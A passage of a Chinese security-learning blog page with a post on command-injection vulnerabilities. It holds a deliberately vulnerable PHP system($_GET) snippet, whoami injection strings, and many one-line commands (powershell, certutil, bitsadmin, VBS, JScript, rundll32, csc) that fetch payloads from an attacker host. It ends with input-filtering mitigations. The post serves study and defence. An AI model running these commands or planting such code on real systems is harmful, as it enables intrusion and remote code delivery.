<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/uploads/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">
<meta property="og:type" content="website">
<meta property="og:title" content="Darren-学无止境">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Darren-学无止境">
<meta property="og:description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Darren-学无止境">
<meta name="twitter:description" content="一天一小步，随着时间的积累，你将会发现你其实已经走了很远。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>Darren-学无止境</title>
  









  <script>
class Circle {
    //创建对象
    //以一个圆为对象
    //设置随机的 x，y坐标，r半径，_mx，_my移动的距离
    //this.r是创建圆的半径，参数越大半径越大
    //this._mx,this._my是移动的距离，参数越大移动
    constructor(x, y) {
        this.x = x;
        this.y = y;
        this.r = Math.random() * 10 ;
        this._mx = Math.random() ;
        this._my = Math.random() ;

    }

    //canvas 画圆和画直线
    //画圆就是正常的用canvas画一个圆
    //画直线是两个圆连线，为了避免直线过多，给圆圈距离设置了一个值，距离很远的圆圈，就不做连线处理
    drawCircle(ctx) {
        ctx.beginPath();
        //arc() 方法使用一个中心点和半径，为一个画布的当前子路径添加一条弧。
        ctx.arc(this.x, this.y, this.r, 0, 360)
        ctx.closePath();
        ctx.fillStyle = 'rgba(204, 204, 204, 0.3)';
        ctx.fill();
    }

    drawLine(ctx, _circle) {
        let dx = this.x - _circle.x;
        let dy = this.y - _circle.y;
        let d = Math.sqrt(dx * dx + dy * dy)
        if (d < 150) {
            ctx.beginPath();
            //开始一条路径，移动到位置 this.x,this.y。创建到达位置 _circle.x,_circle.y 的一条线：
            ctx.moveTo(this.x, this.y);   //起始点
            ctx.lineTo(_circle.x, _circle.y);   //终点
            ctx.closePath();
            ctx.strokeStyle = 'rgba(204, 204, 204, 0.3)';
            ctx.stroke();
        }
    }

    // 圆圈移动
    // 圆圈移动的距离必须在屏幕范围内
    move(w, h) {
        this._mx = (this.x < w && this.x > 0) ? this._mx : (-this._mx);
        this._my = (this.y < h && this.y > 0) ? this._my : (-this._my);
        this.x += this._mx / 2;
        this.y += this._my / 2;
    }
}
//鼠标点画圆闪烁变动
class currentCirle extends Circle {
    constructor(x, y) {
        super(x, y)
    }

    drawCircle(ctx) {
        ctx.beginPath();
        //注释内容为鼠标焦点的地方圆圈半径变化
        //this.r = (this.r < 14 && this.r > 1) ? this.r + (Math.random() * 2 - 1) : 2;
        this.r = 8;
        ctx.arc(this.x, this.y, this.r, 0, 360);
        ctx.closePath();
        //ctx.fillStyle = 'rgba(0,0,0,' + (parseInt(Math.random() * 100) / 100) + ')'
        ctx.fillStyle = 'rgba(255, 77, 54, 0.3)'
        ctx.fill();

    }
}
//更新页面用requestAnimationFrame替代setTimeout
window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;

let canvas = document.getElementById('canvas');
let ctx = canvas.getContext('2d');
let w = canvas.width = canvas.offsetWidth;
let h = canvas.height = canvas.offsetHeight;
let circles = [];
let current_circle = new currentCirle(0, 0)

let draw = function () {
    ctx.clearRect(0, 0, w, h);
    for (let i = 0; i < circles.length; i++) {
        circles[i].move(w, h);
        circles[i].drawCircle(ctx);
        for (j = i + 1; j < circles.length; j++) {
            circles[i].drawLine(ctx, circles[j])
        }
    }
    if (current_circle.x) {
        current_circle.drawCircle(ctx);
        for (var k = 1; k < circles.length; k++) {
            current_circle.drawLine(ctx, circles[k])
        }
    }
    requestAnimationFrame(draw)
}

let init = function (num) {
    for (var i = 0; i < num; i++) {
        circles.push(new Circle(Math.random() * w, Math.random() * h));
    }
    draw();
}
window.addEventListener('load', init(60));
window.onmousemove = function (e) {
    e = e || window.event;
    current_circle.x = e.clientX;
    current_circle.y = e.clientY;
}
window.onmouseout = function () {
    current_circle.x = null;
    current_circle.y = null;

};
</script>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
<a href="https://github.com/Darren-zl"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Darren-学无止境</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-message">
          <a href="/message/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
            
            留言板
          </a>
        </li>
      
        
        <li class="menu-item menu-item-photo">
          <a href="/photo/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-image"></i> <br>
            
            摄影
          </a>
        </li>
      
        
        <li class="menu-item menu-item-music">
          <a href="/music/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-music"></i> <br>
            
            音乐
          </a>
        </li>
      
        
        <li class="menu-item menu-item-welfare">
          <a href="/welfare/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-leaf"></i> <br>
            
            福利
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            书单
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/31/WEB 安全之命令执行漏洞学习实战/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/31/WEB 安全之命令执行漏洞学习实战/" itemprop="url">WEB 安全之命令执行漏洞学习实战</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-31T13:55:34+08:00">
                2020-03-31
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2020/03/31/WEB 安全之命令执行漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2020/03/31/WEB 安全之命令执行漏洞学习实战/" class="cy_cmt_count" data-xid="2020/03/31/WEB 安全之命令执行漏洞学习实战/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2020/03/31/WEB 安全之命令执行漏洞学习实战/" class="leancloud_visitors" data-flag-title="WEB 安全之命令执行漏洞学习实战">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="WEB-安全之命令执行漏洞学习实战"><a href="#WEB-安全之命令执行漏洞学习实战" class="headerlink" title="WEB 安全之命令执行漏洞学习实战"></a>WEB 安全之命令执行漏洞学习实战</h2><h4 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1.命令执行漏洞"></a>1.命令执行漏洞</h4><p>​       应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞，这就是命令执行漏洞。</p>
<h5 id="1-1-Windows管道符"><a href="#1-1-Windows管道符" class="headerlink" title="1.1 Windows管道符"></a>1.1 Windows管道符</h5><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“|”:直接执行后面的语句。如:ping 127.0.0.1|whoami</span><br><span class="line">“||”:如果前面执行的语句出错泽执行后面的语句，前面的语句智能为假 如：ping 2 || whoami</span><br><span class="line">“&amp;”:如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 如 ping 127.0.0.1&amp;whoami</span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>

<h5 id="1-2-Linux管道符"><a href="#1-2-Linux管道符" class="headerlink" title="1.2 Linux管道符"></a>1.2 Linux管道符</h5><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">“;”:执行完前面的语句再执行后面的 例如:ping 127.0.0.1;whoami</span><br><span class="line">“|”:显示后面语句的执行结果 例如:ping 127.0.0.1|whoami</span><br><span class="line">“||”:当前面的语句只能怪出错时，执行后面的语句，例如:ping 1||whoami</span><br><span class="line">“&amp;”:如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如:ping 127.0.0.1&amp;whoami</span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真 例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>

<h5 id="接下来用system函数进行简单的验证："><a href="#接下来用system函数进行简单的验证：" class="headerlink" title="接下来用system函数进行简单的验证："></a>接下来用system函数进行简单的验证：</h5><p>PHP代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> system(<span class="string">"输入"</span>,$_GET[<span class="string">'IP'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200326160548092.png" alt="image-20200326160548092"></p>
<h4 id="2-通过命令执行漏洞传输文件"><a href="#2-通过命令执行漏洞传输文件" class="headerlink" title="2.通过命令执行漏洞传输文件"></a>2.通过命令执行漏洞传输文件</h4><h5 id="2-1-通过powershell下载"><a href="#2-1-通过powershell下载" class="headerlink" title="2.1 通过powershell下载"></a>2.1 通过<strong>powershell</strong>下载</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.5.109/test3.php'</span>,<span class="string">'test3.php'</span>)</span><br><span class="line"></span><br><span class="line">powershell (<span class="built_in">Invoke-WebRequest</span> http://<span class="number">192.168</span>.<span class="number">5.109</span>/test3.php -O test3.php)</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200326175432506.png" alt="image-20200326175432506"></p>
<h5 id="2-2-也可以通过UVC读取文件"><a href="#2-2-也可以通过UVC读取文件" class="headerlink" title="2.2 也可以通过UVC读取文件"></a>2.2 也可以通过UVC读取文件</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1</span><br></pre></td></tr></table></figure>

<h5 id="2-3-通过CScript-WScript"><a href="#2-3-通过CScript-WScript" class="headerlink" title="2.3 通过CScript/WScript"></a>2.3 通过CScript/WScript</h5><p>可以执行UNC路径下的文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //E:jscript \\webdavserver\folder\payload.txt</span><br></pre></td></tr></table></figure>

<p>通过echo写入vbs脚本，再通过cscript来执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">● <span class="built_in">echo</span> <span class="built_in">set</span> a=createobject(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="built_in">set</span> w=createobject(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open ^<span class="string">"get^"</span>,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; c:\windows\temp\d.vbs</span><br><span class="line"></span><br><span class="line">● C:\Users\Administrator&gt;cscript c:\d.vbs http://reverse-tcp.xyz/test3.php  c:\test3.php</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327142349251.png" alt="image-20200327142349251"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327142438095.png" alt="image-20200327142438095"></p>
<h5 id="2-4-通过Bitsadmin"><a href="#2-4-通过Bitsadmin" class="headerlink" title="2.4 通过Bitsadmin"></a>2.4 通过Bitsadmin</h5><p><a href="https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx" target="_blank" rel="noopener">bitsadmin</a>是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。不支持https、ftp协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://download.fb.com/file/xx.zip c:\pentest\xx.zip</span><br><span class="line"></span><br><span class="line">bitsadmin /TRANSFER /DOWNLOAD http://download.sysinternals.com/files/PSTools.zip  E:\PSTools.zip</span><br><span class="line"></span><br><span class="line">bitsadmin /TRANSFER /DOWNLOAD \\webdavserver\folder\payload.ps1  E:\payload.ps1</span><br><span class="line"></span><br><span class="line">bitsadmin /TRANSFER /UPLOAD E:\payload.ps1 \\webdavserver\folder\payload.ps1</span><br></pre></td></tr></table></figure>

<h5 id="2-5-通过Certutil"><a href="#2-5-通过Certutil" class="headerlink" title="2.5 通过Certutil"></a>2.5 通过Certutil</h5><p>Certutil是一个命令行程序，它是作为证书服务的一部分安装的。可以使用Certutil转储并显示证书颁发机构(CA)配置信息、配置证书服务、备份和恢复CA组件，并验证证书、密钥对和证书链。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.5.109/test3.php test3.php</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327152438997.png" alt="image-20200327152438997"></p>
<h5 id="2-6-通过debug"><a href="#2-6-通过debug" class="headerlink" title="2.6 通过debug"></a>2.6 通过debug</h5><h5 id="2-7-通过ftp"><a href="#2-7-通过ftp" class="headerlink" title="2.7 通过ftp"></a>2.7 通过ftp</h5><p>ftp也是一种比较经典的方法，核心就是通过ftp -s:filename.txt去执行filename里边的ftp命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> open 192.168.1.123 21 &gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> ftp&gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> bin &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> ftp &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> GET 1.exe &gt;&gt; ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br></pre></td></tr></table></figure>

<h5 id="2-8-通过CSC"><a href="#2-8-通过CSC" class="headerlink" title="2.8 通过CSC"></a>2.8 通过CSC</h5><p>csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe</p>
<p>当然思路还是将cs文件echo写入目标系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> using System.Net;class WebDL &#123; static void Main(string[] args)&#123;System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);&#125;&#125; &gt; D:\<span class="built_in">test</span>\dl.cs</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327164047328.png" alt="image-20200327164047328"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327163844363.png" alt="image-20200327163844363"></p>
<p>然后调用csc.exe编译cs文件并执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.  c:\windows\microsoft.net\framework\v3.5\csc /out:D:\<span class="built_in">test</span>\dl.exe   D:\<span class="built_in">test</span>\dl.cs</span><br><span class="line">2.  D:\<span class="built_in">test</span>\dl.exe http://192.168.5.109/1.bat D:\<span class="built_in">test</span>\1.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327164143342.png" alt="image-20200327164143342"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327164151976.png" alt="image-20200327164151976"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327164403735.png" alt="image-20200327164403735"></p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200327164416957.png" alt="image-20200327164416957"></p>
<h5 id="2-9-通过JScript"><a href="#2-9-通过JScript" class="headerlink" title="2.9 通过JScript"></a>2.9 通过JScript</h5><p>以下就是一个js的downloader，和vbs的一样可以直接echo写入服务器执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">varObject = WScript.CreateObject(<span class="string">"MSXML2.XMLHTTP"</span>);Object.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.5.109/1.bat"</span>,<span class="literal">false</span>);Object.send();<span class="keyword">if</span>(Object.Status == 200)&#123;varStream = WScript.CreateObject(<span class="string">"ADODB.Stream"</span>);Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(<span class="string">"D:\test\1.bat"</span>, 2);Stream.Close();&#125;</span><br></pre></td></tr></table></figure>

<p>也可以配合rundll32一句话完成下载</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();Object=new%20ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);Object.open(<span class="string">"GET"</span>,<span class="string">"http://192.168.5.109/1.bat"</span>,<span class="literal">false</span>);Object.send();<span class="keyword">if</span>(Object.Status==200)&#123;Stream=new%20ActiveXObject(<span class="string">"ADODB.Stream"</span>);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(<span class="string">"D:\test\1.bat"</span>,2);Stream.Close();&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-对命令执行输入口过滤，杜绝命令执行问题"><a href="#3-对命令执行输入口过滤，杜绝命令执行问题" class="headerlink" title="3.对命令执行输入口过滤，杜绝命令执行问题"></a>3.对命令执行输入口过滤，杜绝命令执行问题</h4><h5 id="3-1-特殊字符过滤"><a href="#3-1-特殊字符过滤" class="headerlink" title="3.1 特殊字符过滤"></a>3.1 特殊字符过滤</h5><p>首先输入以及输出界面需要过滤不必要的特殊字符，如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] |（竖线符号） [<span class="number">2</span>] &amp; （&amp; 符号） [<span class="number">3</span>];（分号） [<span class="number">4</span>] $（美元符号）[<span class="number">5</span>] %（百分比符号） [<span class="number">6</span>] @（at 符号） [<span class="number">7</span>] <span class="string">'（单引号）[8] "（引号）[9] \'（反斜杠转义单引号）[10] \"（反斜杠转义引号） [11] &lt;&gt;（尖括号） [12] ()（括号）[13] +（加号）[14] CR（回车符，ASCII 0x0d） [15] LF（换行，ASCII 0x0a）[16] ,（逗号）[17] \（反斜杠）</span></span><br></pre></td></tr></table></figure>

<h5 id="3-2-限制危险参数"><a href="#3-2-限制危险参数" class="headerlink" title="3.2 限制危险参数"></a>3.2 限制危险参数</h5><p>限制一些危险的函数，如可以调用外部程序的函数：</p>
<p>如：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>eval()</code>、<code>passthru()</code>，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
<h5 id="3-3-杜绝系统层漏洞以及第三方组件漏洞。"><a href="#3-3-杜绝系统层漏洞以及第三方组件漏洞。" class="headerlink" title="3.3 杜绝系统层漏洞以及第三方组件漏洞。"></a>3.3 杜绝系统层漏洞以及第三方组件漏洞。</h5><p>如： bash破壳漏洞(CVE-2014-6271) 、WordPress中用来处理图片的ImageMagick组件、JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)、ThinkPHP命令执行;</p>
<h5 id="3-4-针对真实项目情况，选择不同的函数"><a href="#3-4-针对真实项目情况，选择不同的函数" class="headerlink" title="3.4 针对真实项目情况，选择不同的函数"></a>3.4 针对真实项目情况，选择不同的函数</h5><p>如DVWA命令执行模块中，不可注入的代码中，有如下一段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">$target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>

<p>这是一段IP地址输入的接口，做了以上的防过滤。限制了输入的类型必须是首先必须是数字类然后用（.）进行拼接。所以当针对特定项目的时候可以采用特定的函数进行限制。</p>
<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>DVWA</p>
<p><a href="https://cloud.tencent.com/developer/article/1141143" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1141143</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/24/web安全之XSS漏洞学习实战/" itemprop="url">web安全之XSS漏洞学习实战</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T13:55:34+08:00">
                2020-03-24
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2020/03/24/web安全之XSS漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/" class="cy_cmt_count" data-xid="2020/03/24/web安全之XSS漏洞学习实战/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2020/03/24/web安全之XSS漏洞学习实战/" class="leancloud_visitors" data-flag-title="web安全之XSS漏洞学习实战">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
